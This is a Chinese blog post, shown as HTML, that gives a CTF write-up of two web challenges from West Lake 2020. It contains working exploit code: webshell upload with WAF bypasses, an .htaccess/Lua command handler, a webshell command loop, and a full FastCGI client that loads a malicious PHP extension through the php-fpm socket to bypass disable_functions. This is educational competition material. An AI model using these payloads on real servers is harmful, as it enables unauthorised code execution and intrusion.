@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="一直在啃 web 第 1 题，结果还是没做出来。 自己的不足之处：  WAF WAF 识别 WAF 绕过   一句话（比赛的时候现学的） PHP 相关 绕过 disable_function 绕过 open_dir   XSS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2020年10月西湖论剑CTF部分web题解">
+<meta property="og:url" content="http://example.com/2020/10/14/2020%E5%B9%B410%E6%9C%88%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91CTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/index.html">
+<meta property="og:site_name" content="slug01sh&#39;s blog">
+<meta property="og:description" content="一直在啃 web 第 1 题，结果还是没做出来。 自己的不足之处：  WAF WAF 识别 WAF 绕过   一句话（比赛的时候现学的） PHP 相关 绕过 disable_function 绕过 open_dir   XSS">
+<meta property="og:locale">
+<meta property="article:published_time" content="2020-10-14T02:40:10.000Z">
+<meta property="article:modified_time" content="2020-10-14T03:10:32.014Z">
+<meta property="article:author" content="slug01sh">
+<meta property="article:tag" content="生活">
+<meta property="article:tag" content="安全">
+<meta property="article:tag" content="编程">
+<meta property="article:tag" content="英语">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2020/10/14/2020%E5%B9%B410%E6%9C%88%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91CTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh'
+  };
+</script>
+
+  <title>2020年10月西湖论剑CTF部分web题解 | slug01sh's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">slug01sh's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Think with the world</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-首页">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-分类">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-归档">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-关于">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/10/14/2020%E5%B9%B410%E6%9C%88%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91CTF%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="slug01sh">
+      <meta itemprop="description" content="欢迎大家发表自己的见解与评价">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="slug01sh's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2020年10月西湖论剑CTF部分web题解
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2020-10-14 10:40:10 / Modified: 11:10:32" itemprop="dateCreated datePublished" datetime="2020-10-14T10:40:10+08:00">2020-10-14</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>一直在啃 web 第 1 题，结果还是没做出来。</p>
+<p>自己的不足之处：</p>
+<ol>
+<li>WAF<ol>
+<li>WAF 识别</li>
+<li>WAF 绕过</li>
+</ol>
+</li>
+<li>一句话（比赛的时候现学的）</li>
+<li>PHP 相关<ol>
+<li>绕过 disable_function</li>
+<li>绕过 open_dir</li>
+</ol>
+</li>
+<li>XSS</li>
+</ol>
+<hr>
+<a id="more"></a>
+
+<h1 id="NewUpload（php-fpm任意代码执行）"><a href="#NewUpload（php-fpm任意代码执行）" class="headerlink" title="NewUpload（php-fpm任意代码执行）"></a>NewUpload（php-fpm任意代码执行）</h1><ul>
+<li>使用 Burpsuite 进行文件上传一句话，文件名使用换行绕过，上传内容 %00 截断绕过，post 内容使用 base64 加密，不然会被拦截。</li>
+<li>查看 phpinfo 拿到题目较为明显的2个条件：<ol>
+<li>disable_function，过滤了如下函数</li>
+<li>open_basedir限制了如下目录</li>
+</ol>
+</li>
+<li>读取根目录 var_dump(scandir(“/“));发现 flag 文件和 readflag 文件。</li>
+<li>open_basedir 绕过尝试读取 2 个文件，查看flag文件（没有权限）、readflag文件（二进制文件）。</li>
+<li>使用蚁剑连接，方便后面进行利用。</li>
+</ul>
+<p><strong>解法1:宝塔 Apache 默认安装的 lua 模块配合 htaccess 执行系统命令</strong></p>
+<ul>
+<li>编写并上传 .htaccess 文件</li>
+<li>写一个 1.lua 进行命令执行即可拿到 flag{3be9f1618515e751892cef4cf16f820e}</li>
+</ul>
+<p><strong>.htaccess 文件</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler lua-script .lua</span><br></pre></td></tr></table></figure>
+<p><strong>1.lua</strong></p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span> <span class="string">&quot;string&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handle</span><span class="params">(r)</span></span></span><br><span class="line">    r.content_type = <span class="string">&quot;text/plain&quot;</span></span><br><span class="line">    <span class="keyword">local</span> t = <span class="built_in">io</span>.<span class="built_in">popen</span>(<span class="string">&#x27;/readflag&#x27;</span>)</span><br><span class="line">    <span class="keyword">local</span> a = t:<span class="built_in">read</span>(<span class="string">&quot;*all&quot;</span>)</span><br><span class="line">    r:puts(a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> r.method == <span class="string">&#x27;GET&#x27;</span> <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> <span class="built_in">pairs</span>( r:parseargs() ) <span class="keyword">do</span></span><br><span class="line">            r:puts( <span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">&quot;%s: %s\n&quot;</span>, k, v) )</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        r:puts(<span class="string">&quot;Unsupported HTTP method &quot;</span> .. r.method)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+
+
+<p><strong>解法3：利用tmp下的php-fpm socket加载扩展（利用蚁剑插件）</strong></p>
+<ul>
+<li>编译并上传 ant.so。</li>
+<li>上传蚁剑的加载拓展脚本 2.php</li>
+<li>上传 s.php 执行函数</li>
+<li>访问 s.php 得到 flag。 </li>
+</ul>
+<p><strong>方便执行代码（自己base64）</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    url = <span class="string">&quot;http://newupload.xhlj.wetolink.com/sandbox/i631kn4rq3skctfkab4d65uhuc/upload/5.php&quot;</span></span><br><span class="line">    resp = session.post(</span><br><span class="line">        url=url,</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;pass&#x27;</span>: input()</span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line">    print(resp.text)</span><br><span class="line">    print(<span class="string">&#x27;------------------------------------&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p><strong>2.php</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Client</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> VERSION_1            = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> BEGIN_REQUEST        = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> PARAMS               = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">const</span> STDIN                = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">const</span> STDOUT               = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">const</span> STDERR               = <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">const</span> DATA                 = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">const</span> GET_VALUES           = <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">const</span> GET_VALUES_RESULT    = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">const</span> UNKNOWN_TYPE         = <span class="number">11</span>;</span><br><span class="line">    <span class="keyword">const</span> RESPONDER            = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">protected</span> $keepAlive = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">protected</span> $_requests = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">protected</span> $_requestCounter = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">buildPacket</span>(<span class="params">$type, $content, $requestId = <span class="number">1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $offset = <span class="number">0</span>;</span><br><span class="line">        $totLen = strlen($content);</span><br><span class="line">        $buf    = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="comment">// Packets can be a maximum of 65535 bytes</span></span><br><span class="line">            $part = substr($content, $offset, <span class="number">0xffff</span> - <span class="number">8</span>);</span><br><span class="line">            $segLen = strlen($part);</span><br><span class="line">            $buf .= chr(<span class="built_in">self</span>::VERSION_1)        <span class="comment">/* version */</span></span><br><span class="line">                . chr($type)                    <span class="comment">/* type */</span></span><br><span class="line">                . chr(($requestId &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) <span class="comment">/* requestIdB1 */</span></span><br><span class="line">                . chr($requestId &amp; <span class="number">0xFF</span>)        <span class="comment">/* requestIdB0 */</span></span><br><span class="line">                . chr(($segLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>)    <span class="comment">/* contentLengthB1 */</span></span><br><span class="line">                . chr($segLen &amp; <span class="number">0xFF</span>)           <span class="comment">/* contentLengthB0 */</span></span><br><span class="line">                . chr(<span class="number">0</span>)                        <span class="comment">/* paddingLength */</span></span><br><span class="line">                . chr(<span class="number">0</span>)                        <span class="comment">/* reserved */</span></span><br><span class="line">                . $part;                        <span class="comment">/* content */</span></span><br><span class="line">            $offset += $segLen;</span><br><span class="line">        &#125; <span class="keyword">while</span> ($offset &lt; $totLen);</span><br><span class="line">        <span class="keyword">return</span> $buf;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">buildNvpair</span>(<span class="params">$name, $value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $nlen = strlen($name);</span><br><span class="line">        $vlen = strlen($value);</span><br><span class="line">        <span class="keyword">if</span> ($nlen &lt; <span class="number">128</span>) &#123;</span><br><span class="line">            <span class="comment">/* nameLengthB0 */</span></span><br><span class="line">            $nvpair = chr($nlen);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span></span><br><span class="line">            $nvpair = chr(($nlen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . chr(($nlen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . chr(($nlen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . chr($nlen &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($vlen &lt; <span class="number">128</span>) &#123;</span><br><span class="line">            <span class="comment">/* valueLengthB0 */</span></span><br><span class="line">            $nvpair .= chr($vlen);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span></span><br><span class="line">            $nvpair .= chr(($vlen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . chr(($vlen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . chr(($vlen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . chr($vlen &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* nameData &amp; valueData */</span></span><br><span class="line">        <span class="keyword">return</span> $nvpair . $name . $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">readNvpair</span>(<span class="params">$data, $length = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($length === <span class="literal">null</span>) &#123;</span><br><span class="line">            $length = strlen($data);</span><br><span class="line">        &#125;</span><br><span class="line">        $array = <span class="keyword">array</span>();</span><br><span class="line">        $p = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ($p != $length) &#123;</span><br><span class="line">            $nlen = ord($data&#123;$p++&#125;);</span><br><span class="line">            <span class="keyword">if</span> ($nlen &gt;= <span class="number">128</span>) &#123;</span><br><span class="line">                $nlen = ($nlen &amp; <span class="number">0x7F</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">                $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">                $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">                $nlen |= (ord($data&#123;$p++&#125;));</span><br><span class="line">            &#125;</span><br><span class="line">            $vlen = ord($data&#123;$p++&#125;);</span><br><span class="line">            <span class="keyword">if</span> ($vlen &gt;= <span class="number">128</span>) &#123;</span><br><span class="line">                $vlen = ($nlen &amp; <span class="number">0x7F</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">                $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">                $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">                $vlen |= (ord($data&#123;$p++&#125;));</span><br><span class="line">            &#125;</span><br><span class="line">            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);</span><br><span class="line">            $p += ($nlen + $vlen);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $array;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">buildAllPacket</span>(<span class="params"><span class="keyword">array</span> $params, $stdin</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// Ensure new requestID is not already being tracked</span></span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_requestCounter++;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;_requestCounter &gt;= <span class="number">65536</span> <span class="comment">/* or (1 &lt;&lt; 16) */</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;_requestCounter = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $id = <span class="keyword">$this</span>-&gt;_requestCounter;</span><br><span class="line">        &#125; <span class="keyword">while</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_requests[$id]));</span><br><span class="line">        $request = <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::BEGIN_REQUEST, chr(<span class="number">0</span>) . chr(<span class="built_in">self</span>::RESPONDER) . chr((<span class="keyword">int</span>) <span class="keyword">$this</span>-&gt;keepAlive) . str_repeat(chr(<span class="number">0</span>), <span class="number">5</span>), $id);</span><br><span class="line">        $paramsRequest = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> ($params <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">            $paramsRequest .= <span class="keyword">$this</span>-&gt;buildNvpair($key, $value, $id);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($paramsRequest) &#123;</span><br><span class="line">            $request .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::PARAMS, $paramsRequest, $id);</span><br><span class="line">        &#125;</span><br><span class="line">        $request .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::PARAMS, <span class="string">&#x27;&#x27;</span>, $id);</span><br><span class="line">        <span class="keyword">if</span> ($stdin) &#123;</span><br><span class="line">            $request .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::STDIN, $stdin, $id);</span><br><span class="line">        &#125;</span><br><span class="line">        $request .= <span class="keyword">$this</span>-&gt;buildPacket(<span class="built_in">self</span>::STDIN, <span class="string">&#x27;&#x27;</span>, $id);</span><br><span class="line">        <span class="keyword">return</span> $request;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$sock = stream_socket_client(<span class="string">&quot;unix:///tmp/php-cgi-74.sock&quot;</span>, $errno, $errstr);</span><br><span class="line">$client = <span class="keyword">new</span> Client();</span><br><span class="line">$payload_file = <span class="string">&quot;/www/wwwroot/10.20.124.208/sandbox/af1e5s04sho98l744pqcdauk32/upload/s.php&quot;</span>;</span><br><span class="line">$params = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;REQUEST_METHOD&#x27;</span> =&gt; <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span> =&gt; $payload_file,</span><br><span class="line">    <span class="string">&#x27;PHP_ADMIN_VALUE&#x27;</span> =&gt; <span class="string">&quot;extension_dir = /www/wwwroot/10.20.124.208/sandbox/af1e5s04sho98l744pqcdauk32/upload\nextension = 1.so&quot;</span>,</span><br><span class="line">    <span class="comment">//这里$payload_file。是我们调用恶意so执行的php命令。extension_dir是扩展目录extension是扩展名</span></span><br><span class="line">);</span><br><span class="line">$data = $client-&gt;buildAllPacket($params, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">fwrite($sock, $data);</span><br><span class="line">var_dump(fread($sock, <span class="number">4096</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>s.php</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> antsystem(<span class="string">&quot;/readflag&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>参考教程：</p>
+<ol>
+<li>从一道CTF学习Fastcgi绕过姿势：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/186186#h2-4">https://www.anquanke.com/post/id/186186#h2-4</a></li>
+<li>2019 0ctf final Web Writeup（1）：<a target="_blank" rel="noopener" href="https://skysec.top/2019/06/10/2019%200ctf%20final%20Web%20Writeup%EF%BC%881%EF%BC%89/">https://skysec.top/2019/06/10/2019%200ctf%20final%20Web%20Writeup%EF%BC%881%EF%BC%89/</a></li>
+<li>php 自定义恶意扩展 so 编写过程：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7330#toc-3">https://xz.aliyun.com/t/7330#toc-3</a></li>
+<li>Fastcgi 协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a> </li>
+<li>西湖论剑初赛Web1/5：<a target="_blank" rel="noopener" href="https://guokeya.github.io/post/qKqMPs-ml/">https://guokeya.github.io/post/qKqMPs-ml/</a></li>
+</ol>
+<hr>
+<h1 id="EasyJson（php-审计）"><a href="#EasyJson（php-审计）" class="headerlink" title="EasyJson（php 审计）"></a>EasyJson（php 审计）</h1><p><strong>基本步骤</strong></p>
+<ul>
+<li>filename=index.php 可过 check</li>
+<li>使用 application/json 类型的 enctype 发送构造好的数据包</li>
+<li>使用 burpsuite 将关键代码转 unicode，发送后得到地址。(不用改 x-Forward-For 也可以)</li>
+<li>执行命令：<br><a target="_blank" rel="noopener" href="http://easyjson.xhlj.wetolink.com/sandbox/7b9ef9125d41695d113f4d1d2d245886aaa89edc/?0=system&amp;1=/readflag">http://easyjson.xhlj.wetolink.com/sandbox/7b9ef9125d41695d113f4d1d2d245886aaa89edc/?0=system&amp;1=/readflag</a></li>
+<li>得到 flag{a5db5397505f825334aa4dfc17d3bb9f} Powered By Dbapp OSS.</li>
+</ul>
+<p><strong>题目源码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;security.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$sandbox = <span class="string">&#x27;sandbox/&#x27;</span>.sha1($_SERVER[<span 